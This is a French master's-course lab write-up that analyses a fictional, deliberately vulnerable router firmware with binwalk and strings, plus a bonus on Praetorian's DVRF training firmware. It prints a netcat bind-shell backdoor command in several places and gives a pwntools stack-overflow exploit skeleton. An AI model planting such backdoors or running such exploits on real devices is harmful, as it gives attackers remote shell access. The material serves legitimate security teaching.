# Write-up — Lab 22 : Firmware IoT Analysis — AngeRouter v2.1

> **Pilier 3 — Embarqué / C-ASM x86-64 · ARM / QEMU**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![IoT](https://img.shields.io/badge/target-IoT%20Router-purple.svg)]()
[![binwalk](https://img.shields.io/badge/tool-binwalk-orange.svg)]()
[![squashfs](https://img.shields.io/badge/fs-SquashFS-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Cible :** Firmware router fictif `AngeRouter v2.1` (MIPSEL, SquashFS + header custom)  
**Technique :** `binwalk` → extraction SquashFS → analyse statique → 3 flags trouvés  
**Flags :**
- `AngeVirus{firmware_creds_in_plaintext}` — dans `/etc/config/httpd.conf`
- `AngeVirus{hidden_flag_in_firmware_var_secret}` — dans `/var/.secret` (fichier caché)
- `AngeVirus{hardcoded_in_binary}` — dans `strings bin/httpd`

---

## 2. Structure du firmware

```
firmware.bin
├── [0x00..0x07]  Header custom : "ANGFW\x00\x00\x00"
└── [0x08..]      SquashFS (LZMA) contenant :
    rootfs/
    ├── etc/
    │   ├── passwd           — utilisateurs (dont compte support avec pass)
    │   └── config/
    │       ├── httpd.conf   — credentials admin en clair + FLAG
    │       └── system.conf  — SSID/WPA2 par défaut
    ├── bin/
    │   └── httpd            — binaire MIPSEL avec SECRET hardcodé + overflow
    ├── var/
    │   └── .secret          — FLAG caché
    └── usr/share/
        └── backdoor.sh      — backdoor oublié port 31337
```

---

## 3. Création du firmware

```bash
chmod +x create_firmware.sh
./create_firmware.sh
```

Prérequis : `mipsel-linux-gnu-gcc`, `mksquashfs` (`squashfs-tools`), `binwalk`

```bash
sudo apt install squashfs-tools binwalk mipsel-linux-gnu-gcc
```

---

## 4. Analyse — étapes

### 4.1 Identification

```bash
file firmware.bin
# firmware.bin: data (header custom non reconnu par file)

binwalk firmware.bin
# DECIMAL   HEX       DESCRIPTION
# 8         0x8       Squashfs filesystem, little endian, lzma compression...
```

**Observation :** header non standard (magic `ANGFW`) → `binwalk` l'ignore et trouve le SquashFS dès l'offset 8.

### 4.2 Extraction

```bash
binwalk -e firmware.bin
ls _firmware.bin.extracted/
# 8.squashfs  8
```

### 4.3 Montage SquashFS

```bash
unsquashfs _firmware.bin.extracted/8.squashfs
cd squashfs-root/
```

### 4.4 Reconnaissance du filesystem

```bash
ls -la etc/
cat etc/passwd
# → compte "support" avec hash MD5 faible

cat etc/config/httpd.conf
# → admin_pass=AngeRouter2024!
# → secret_key=AngeVirus{firmware_creds_in_plaintext}   ← FLAG 1
```

### 4.5 Fichiers cachés

```bash
find . -name ".*" -type f
# ./var/.secret

cat var/.secret
# AngeVirus{hidden_flag_in_firmware_var_secret}          ← FLAG 2
```

### 4.6 Analyse du binaire httpd

```bash
file bin/httpd
# ELF 32-bit LSB executable, MIPS, MIPS32

strings bin/httpd | grep -i "angevirus\|flag\|secret"
# AngeVirus{hardcoded_in_binary}                         ← FLAG 3
# AngeRouter2024!
```

### 4.7 Backdoor découverte

```bash
cat usr/share/backdoor.sh
# nc -lp 31337 -e /bin/sh   ← backdoor dev oublié en prod
```

---

## 5. Résumé des vulnérabilités

| Vuln | Fichier | Impact |
| --- | --- | --- |
| Credentials en clair | `etc/config/httpd.conf` | Admin compromise |
| Fichier caché | `var/.secret` | Flag exfiltré |
| Secret hardcodé binaire | `bin/httpd` | Reverse engineering trivial |
| Backdoor oublié | `usr/share/backdoor.sh` | RCE port 31337 |
| Overflow `strcpy` | `bin/httpd:parse_auth()` | Stack smashing → RCE |
| Hash MD5 faible | `etc/passwd` (compte support) | Bruteforce |
| Telnet activé | `etc/config/httpd.conf` | MITM cleartext |
| WPA2 par défaut | `etc/config/system.conf` | WiFi compromise |

---

## 6. Outils utilisés

| Outil | Usage |
| --- | --- |
| `binwalk` | Identifier et extraire les composants du firmware |
| `unsquashfs` | Décompresser le filesystem SquashFS |
| `strings` | Trouver des chaînes dans les binaires |
| `find` | Localiser fichiers cachés |
| `file` | Identifier les types de fichiers |
| `grep -r` | Recherche récursive de patterns |

---

## 7. Progression Pilier 3 complète

| Lab | Technique | Arch | Difficulté |
| --- | --- | --- | --- |
| Lab13 | Ghidra RE / XOR crackme | x86 | ★☆☆ |
| Lab14 | Rust reverse shell | x86 | ★★☆ |
| Lab15 | Rust ptrace injection | x86 | ★★★ |
| Lab16 | Rust AMSI bypass | Windows | ★★★ |
| Lab17 | Rust shellcode loader | x86 | ★★☆ |
| Lab18 | ARM ret2win | ARM32 | ★☆☆ |
| Lab19 | ARM ROP system@plt | ARM32 | ★★☆ |
| Lab20 | ARM ret2syscall SVC#0 | ARM32 | ★★★ |
| Lab21 | MIPS ret2win | MIPSEL | ★★☆ |
| **Lab22** | **Firmware IoT analysis** | **MIPSEL** | **★★☆** |

---

## Résumé — AngeRouter (firmware fictif)

| Élément | Valeur |
| --- | --- |
| Format firmware | Header custom (ANGFW) + SquashFS LZMA |
| Architecture binaires | MIPSEL 32-bit |
| Flags trouvés | 3 (config, hidden file, binary strings) |
| Backdoor | nc -e /bin/sh port 31337 |
| Overflow | `strcpy` dans `parse_auth()` — sans protection |

> Screenshots : [docs/lab22_binwalk.png](docs/lab22_binwalk.png) · [docs/lab22_flags.png](docs/lab22_flags.png)

---

## 8. Bonus — DVRF : vrai firmware vulnérable

**DVRF** (Damn Vulnerable Router Firmware) est un firmware MIPSEL conçu par Praetorian pour la formation en sécurité embarquée. Il inclut des binaires intentionnellement vulnérables (stack overflow, format string, command injection) dans un vrai système de fichiers router.

### 8.1 Téléchargement et extraction

```bash
chmod +x dvrf_analyze.sh
./dvrf_analyze.sh
# → télécharge DVRF_v03.bin (~7 MB), extrait via binwalk + unsquashfs
```

### 8.2 Structure DVRF

```text
dvrf-root/
├── etc/
│   ├── passwd          — root sans mot de passe (hash vide)
│   └── init.d/         — scripts de démarrage
├── pwnable/
│   ├── Intro/
│   │   ├── stack_bof_01   — stack overflow basique (gets)
│   │   └── stack_bof_02   — stack overflow avec canary
│   ├── ShellCode/
│   │   └── shell_code_01  — injection shellcode MIPS
│   └── Format_String/
│       └── format_01      — format string vulnerability
└── www/                — interface web (CGI)
```

### 8.3 Comparaison firmware fictif vs DVRF

| Critère | AngeRouter (fictif) | DVRF (réel) |
| --- | --- | --- |
| Architecture | MIPSEL 32-bit | MIPSEL 32-bit |
| Filesystem | SquashFS LZMA | SquashFS LZMA |
| Header custom | Oui (ANGFW magic) | Non (standard) |
| Vulnérabilités | 6 catégories documentées | 15+ binaires exploitables |
| Binaires | 1 (httpd.c) | Vrai toolchain busybox |
| Usage pédagogique | Démonstration concepts IoT | Exploitation MIPS avancée |

### 8.4 Exploitation DVRF (pwntools MIPSEL)

```bash
# Sous QEMU user-mode
qemu-mipsel -L /usr/mipsel-linux-gnu dvrf-root/pwnable/Intro/stack_bof_01

# Exploit (même technique que Lab21)
python3 -c "
from pwn import *
elf = ELF('dvrf-root/pwnable/Intro/stack_bof_01')
context.arch   = 'mips'
context.endian = 'little'
# OFFSET à déterminer avec cyclic + objdump
payload = b'A' * OFFSET + p32(win_addr)
p = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu', elf.path])
p.send(payload)
p.interactive()
"
```

### 8.5 Vulnérabilités DVRF vs AngeRouter

| Vulnérabilité | AngeRouter | DVRF |
| --- | --- | --- |
| Stack overflow (gets/strcpy) | `parse_auth()` | `stack_bof_01/02` |
| Format string | — | `format_01` |
| Shellcode injection | — | `shell_code_01` |
| Credentials en clair | httpd.conf | /etc/passwd (root:) |
| Backdoor shell | nc port 31337 | init scripts |
| CGI injection | — | www/ (commande injection) |

---

## 9. Résumé technique complet

| Élément | Valeur |
| --- | --- |
| Format firmware | Header custom (ANGFW) + SquashFS LZMA |
| Architecture binaires | MIPSEL 32-bit |
| Flags trouvés | 3 (config, hidden file, binary strings) |
| Backdoor | nc -e /bin/sh port 31337 |
| Overflow | `strcpy` dans `parse_auth()` — sans protection |
| Bonus DVRF | 15+ binaires vulnérables, même pipeline binwalk |

> Screenshots : [docs/lab22_binwalk.png](docs/lab22_binwalk.png) · [docs/lab22_flags.png](docs/lab22_flags.png) · [docs/lab22_dvrf_binwalk.png](docs/lab22_dvrf_binwalk.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
